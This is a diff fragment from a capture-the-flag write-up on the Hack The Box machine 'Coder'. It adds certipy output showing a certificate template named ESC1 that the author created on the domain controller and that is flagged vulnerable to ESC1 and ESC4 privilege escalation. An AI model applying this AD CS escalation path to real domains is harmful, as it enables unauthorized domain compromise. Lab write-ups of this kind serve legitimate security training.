@@ -1043,6 +1043,50 @@ evil-winrm-py PS C:\Users\e.black\Desktop> New-ADCSTemplate -DisplayName "ESC1" 
 And now ill use the cmd let from `ADCSTemplate.psm1` to create the new template from the esc1 json file then also set the identity so my user can enroll
 
 ```python
+  0
+    Template Name                       : ESC1
+    Display Name                        : ESC1
+    Certificate Authorities             : coder-DC01-CA
+    Enabled                             : True
+    Client Authentication               : True
+    Enrollment Agent                    : False
+    Any Purpose                         : False
+    Enrollee Supplies Subject           : True
+    Certificate Name Flag               : EnrolleeSuppliesSubject
+    Extended Key Usage                  : Client Authentication
+    Requires Manager Approval           : False
+    Requires Key Archival               : False
+    Authorized Signatures Required      : 0
+    Schema Version                      : 2
+    Validity Period                     : 1 year
+    Renewal Period                      : 6 weeks
+    Minimum RSA Key Length              : 2048
+    Template Created                    : 2026-11-20T02:59:17+00:00
+    Template Last Modified              : 2026-11-20T02:59:17+00:00
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights               : CODER.HTB\PKI Admins
+      Object Control Permissions
+        Owner                           : CODER.HTB\Erron Black
+        Full Control Principals         : CODER.HTB\Domain Admins
+                                          CODER.HTB\Local System
+                                          CODER.HTB\Enterprise Admins
+        Write Owner Principals          : CODER.HTB\Domain Admins
+                                          CODER.HTB\Local System
+                                          CODER.HTB\Enterprise Admins
+        Write Dacl Principals           : CODER.HTB\Domain Admins
+                                          CODER.HTB\Local System
+                                          CODER.HTB\Enterprise Admins
+    [+] User Enrollable Principals      : CODER.HTB\PKI Admins
+    [+] User ACL Principals             : CODER.HTB\Erron Black
+    [!] Vulnerabilities
+      ESC1                              : Enrollee supplies subject and template allows client authentication.
+      ESC4                              : Template is owned by user.
+```
+
+And now running certipy i see its vulnerable
+
+```python
 
 ```
 
